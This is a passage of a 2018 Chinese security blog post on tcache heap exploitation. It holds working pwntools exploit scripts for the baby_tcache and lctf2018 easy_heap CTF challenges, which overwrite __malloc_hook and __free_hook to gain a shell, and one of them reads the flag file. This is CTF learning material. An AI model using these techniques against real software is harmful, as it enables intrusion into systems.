= fit(filler=&quot;L&quot;, length=0xD30 - 0x10)</span><br><span class="line">    new_heap(L)</span><br><span class="line">    # ...and allocate M, which is assigned the same address that X had!</span><br><span class="line">    M = fit(filler=&quot;M&quot;, length=0x1000)</span><br><span class="line">    new_heap(M)</span><br><span class="line"></span><br><span class="line">    # allocate any chunk after M, so that when we free M it doesn&apos;t coalesce with the top chunk</span><br><span class="line">    Z = fit(filler=&quot;Z&quot;, length=0x1000)</span><br><span class="line">    new_heap(Z)</span><br><span class="line"></span><br><span class="line">    # now, free M so that it goes in the unsorted bin and populates its `fd` and `bk` fields</span><br><span class="line">    # with the address of the unsorted bin</span><br><span class="line">    delete_heap(7)</span><br><span class="line"></span><br><span class="line">    # reallocate M as M1, specifying a size of 0x1000 but providing only 3 bytes of data</span><br><span class="line">    # (the 3 least significative bytes of the address of the one gadget)</span><br><span class="line">    M1 = p32(one_gadget_addr &amp; 0xFFFFFF)[:-1]</span><br><span class="line">    new_heap(M1, size=0x1000)</span><br><span class="line">    # since M1 overlaps with X, with this reallocation we changed the lowest 3 bytes of</span><br><span class="line">    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and now is the address of the one-gadget)</span><br><span class="line"></span><br><span class="line">    # (free chunks we don&apos;t use anymore, since the binary allows to use</span><br><span class="line">    # at maximum 10 &quot;heaps&quot; (as it calls them) at a time)</span><br><span class="line">    delete_heap(8)</span><br><span class="line"></span><br><span class="line">    # as explained before, we malloc a chunk of size 0x20 to pull X from `tcache-&gt;entries[1]`...</span><br><span class="line">    Z = fit(filler=&quot;Z&quot;, length=0x20)</span><br><span class="line">    new_heap(Z)</span><br><span class="line">    # ...and now `tcache-&gt;entries[1] = ONE_GADGET_ADDR -&gt; ???`</span><br><span class="line"></span><br><span class="line">    # ######################################################################## #</span><br><span class="line"></span><br><span class="line">    # we free the `__mallok_hook` chunk, completing step 4)</span><br><span class="line">    delete_heap(0)</span><br><span class="line">    # now the address of the one-gadget is written at the address of `__malloc_hook`</span><br><span class="line"></span><br><span class="line">    # in step 5), we malloc any chunk to trigger `__malloc_hook()`...</span><br><span class="line">    io.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)</span><br><span class="line">    io.sendlineafter(&quot;Size:&quot;, &quot;123&quot;)</span><br><span class="line"></span><br><span class="line">    # ...and the shell pops!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def new_heap(data, size=None):</span><br><span class="line">    out = io.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    if &quot;Invalid&quot; in out:</span><br><span class="line">        # remote didn&apos;t receive data correctly, quit early</span><br><span class="line">        raise EOFError</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">    out = io.recvuntil(&quot;Size:&quot;)</span><br><span class="line">    if &quot;Invalid&quot; in out:</span><br><span class="line">        # remote didn&apos;t receive data correctly, quit early</span><br><span class="line">        raise EOFError</span><br><span class="line">    if not size:</span><br><span class="line">        io.sendline(str(len(data)))</span><br><span class="line">    else:</span><br><span class="line">        io.sendline(str(size))</span><br><span class="line"></span><br><span class="line">    out = io.recvuntil(&quot;Data:&quot;)</span><br><span class="line">    if &quot;Invalid&quot; in out:</span><br><span class="line">        # remote didn&apos;t receive data correctly, quit early</span><br><span class="line">        raise EOFError</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete_heap(index):</span><br><span class="line">    out = io.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    if &quot;Invalid&quot; in out:</span><br><span class="line">        # remote didn&apos;t receive data correctly, quit early</span><br><span class="line">        raise EOFError</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">    out = io.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    if &quot;Invalid&quot; in out:</span><br><span class="line">        # remote didn&apos;t receive data correctly, quit early</span><br><span class="line">        raise EOFError</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binary = ELF(&quot;./baby_tcache&quot;)  # https://github.com/integeruser/bowkin</span><br><span class="line">libc = ELF(&quot;./libc.so&quot;)</span><br><span class="line"></span><br><span class="line"># as said above, we need some bruteforcing</span><br><span class="line">with context.quiet:</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        i += 1</span><br><span class="line">        print(i)</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            if not args[&quot;REMOTE&quot;]:</span><br><span class="line">                argv = [binary.path]</span><br><span class="line">                envp = &#123;&quot;PWD&quot;: os.getcwd()&#125;</span><br><span class="line"></span><br><span class="line">                if args[&quot;GDB&quot;]:</span><br><span class="line">                    io = gdb.debug(</span><br><span class="line">                        args=argv,</span><br><span class="line">                        env=envp,</span><br><span class="line">                        aslr=False,</span><br><span class="line">                        terminal=[&quot;tmux&quot;, &quot;new-window&quot;],</span><br><span class="line">                        gdbscript=&quot;&quot;&quot;</span><br><span class="line">                            set breakpoint pending on</span><br><span class="line">                            set follow-fork-mode parent</span><br><span class="line">                            baseaddr</span><br><span class="line">                            set $chunks = $baseaddr+0x202060</span><br><span class="line">                            continue</span><br><span class="line">                        &quot;&quot;&quot;,</span><br><span class="line">                    )</span><br><span class="line">                else:</span><br><span class="line">                    io = process(argv=argv, env=envp)</span><br><span class="line">            else:</span><br><span class="line">                io = remote(&quot;52.68.236.186&quot;, 56746)</span><br><span class="line"></span><br><span class="line">            if args[&quot;GDB&quot;]:</span><br><span class="line">                libc_address = 0x7FFFF79E4000</span><br><span class="line">            else:</span><br><span class="line">                libc_address = (</span><br><span class="line">                    0x7F6A5C9E2000</span><br><span class="line">                )  # one of the many possible base addresses of libc, taken from GDB</span><br><span class="line">                # we need to re-execute this exploit until the remote program</span><br><span class="line">                # uses this address as base address of libc</span><br><span class="line"></span><br><span class="line">            __malloc_hook_addr = libc_address + 0x3EBC30</span><br><span class="line"></span><br><span class="line">            # $ one_gadget libc.so.6</span><br><span class="line">            # . . .</span><br><span class="line">            # 0x10a38c        execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">            # constraints:</span><br><span class="line">            #   [rsp+0x70] == NULL</span><br><span class="line">            one_gadget_addr = libc_address + 0x10A38C</span><br><span class="line"></span><br><span class="line">            exploit()</span><br><span class="line"></span><br><span class="line">            if args[&quot;GDB&quot;]:</span><br><span class="line">                io.interactive()</span><br><span class="line">                break  # stop bruteforce</span><br><span class="line">            else:</span><br><span class="line">                out = io.recv(200, timeout=2)</span><br><span class="line">                if &quot;Data:&quot; in out:</span><br><span class="line">                    # something went wrong</span><br><span class="line">                    raise EOFError</span><br><span class="line">                # otherwise, we should have a shell</span><br><span class="line">                sleep(0.5)</span><br><span class="line">                io.sendline(&quot;ls&quot;)</span><br><span class="line">                sleep(0.5)</span><br><span class="line">                io.sendline(&quot;ls /home/&quot;)</span><br><span class="line">                sleep(0.5)</span><br><span class="line">                io.sendline(&quot;ls /home/baby_tcache/&quot;)</span><br><span class="line">                sleep(0.5)</span><br><span class="line">                io.sendline(&quot;cat /home/baby_tcache/fl4g.txt&quot;)</span><br><span class="line">                sleep(0.5)</span><br><span class="line">                io.interactive()</span><br><span class="line">                break  # stop bruteforce</span><br><span class="line">        except EOFError:</span><br><span class="line">            io.close()</span><br></pre></td></tr></table></figure>
+<h1 id="lctf2018-easy-heap"><a href="#lctf2018-easy-heap" class="headerlink" title="lctf2018 easy_heap"></a>lctf2018 easy_heap</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line">def add(size,data):</span><br><span class="line">    p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;size&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;content&apos;)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">    p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;index&apos;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p=process(&apos;./easy_heap&apos;) #,env=&#123;&apos;LD_PRELOAD&apos;:&apos;./libc64.so&apos;&#125;)</span><br><span class="line">#p=remote(&apos;118.25.150.134&apos;, 6666) </span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0xf0,&apos;aaa\n&apos;)</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">for i in range(3,8):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(9)</span><br><span class="line">dele(8)</span><br><span class="line">dele(2)</span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0xf0,&apos;aaa\n&apos;)</span><br><span class="line"># 这时候，unsorted bin中还有3个块，申请一个出来时，剩下的都会被添加到tcache中</span><br><span class="line">add(0,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">0x5595c02f3500 PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = 0, </span><br><span class="line">  mchunk_size = 257, </span><br><span class="line">  fd = 0x5595c02f3b00, </span><br><span class="line">  bk = 0x5595c02f3300, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">            </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"># 这里需要注意，不能添加任何值，否则会破坏里边的指针</span><br><span class="line">add(0xf8, &apos;\n&apos;)</span><br><span class="line">dele(0)</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">dele(4)</span><br><span class="line">dele(6)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">0x5595c02f3600 &#123;</span><br><span class="line">  mchunk_prev_size = 256, </span><br><span class="line">  mchunk_size = 256, </span><br><span class="line">  fd = 0x559500616161, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">dele(5)</span><br><span class="line">p.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&quot;index \n&gt; &quot;)</span><br><span class="line">p.sendline(&apos;8&apos;)</span><br><span class="line"></span><br><span class="line">addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;addr&quot;, hex(addr)</span><br><span class="line">libc_base = addr - (0x7f3c863a4c78 - 0x7f3c85fca000)</span><br><span class="line">print &quot;libc_base&quot;, hex(libc_base)</span><br><span class="line">free_hook = libc_base+libc.symbols[&apos;__free_hook&apos;]</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(16,&apos;/bin/bash\n&apos;)</span><br><span class="line">one = libc_base + 0xfccde</span><br><span class="line">print &quot;free_hook&quot;, hex(free_hook)</span><br><span class="line">add(0,&apos;&apos;)</span><br><span class="line">dele(5)</span><br><span class="line">dele(8)</span><br><span class="line">dele(9)</span><br><span class="line">add(16,p64(free_hook)+&apos;\n&apos;)</span><br><span class="line">add(16,&apos;abc\n&apos;)</span><br><span class="line">add(16,p64(one)+&apos;\n&apos;)</span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/19071/">https://www.tiandiwuji.top/posts/19071/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/19071/">November 2nd 2018, 12:15:33 pm</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/54250/" title="house_of_roman">
+                    <div class="nextTitle">house_of_roman</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/49989/" title="hitcon-复现">
+                    <div class="prevTitle">hitcon-复现</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#tcache介绍"><span class="toc-number">1.</span> <span class="toc-text">tcache介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#影响"><span class="toc-number">2.</span> <span class="toc-text">影响</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#gundam"><span class="toc-number">3.</span> <span class="toc-text">gundam</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hitcon-2018-children-tcache"><span class="toc-number">4.</span> <span class="toc-text">hitcon 2018 children_tcache</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#baby-tcache"><span class="toc-number">5.</span> <span class="toc-text">baby_tcache</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lctf2018-easy-heap"><span class="toc-number">6.</span> <span class="toc-text">lctf2018 easy_heap</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 71
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href="/posts/30918/">day-day-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/31116/">ctf题目-php调试分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/36891/">php7.2内核调试环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href="/posts/46756/">linux-优化实战笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/posts/41159/">RealWorldFinal</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href="/posts/4968/">pwnable.tw练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href="/posts/48844/">bctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/59263/">安全设备名词解释</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/23961/">安全域划分的相关问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href="/posts/16617/">code-breaking</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/posts/3376/">lctf-2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href="/posts/62306/">babystack-ret2dlsolve</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/posts/49484/">hctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href="/posts/59104/">SROP-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href="/posts/49989/">hitcon-复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/30021/">hack-lu</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href="/posts/56316/">netty入门到精通-初识NIO</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/posts/61088/">php-项目结构</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/posts/11284/">jvm-java虚拟机如何运行java字节码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/21</span><a class="archive-post-title" href="/posts/1345/">pwnable.kr_刷刷刷</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/62824/">dubbo项目结构</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/28842/">zookeeper安装-启动</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/11234/">dubbo-启动</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href="/posts/32469/">noxctf-writeup</a>
+        </li>
+    
+    
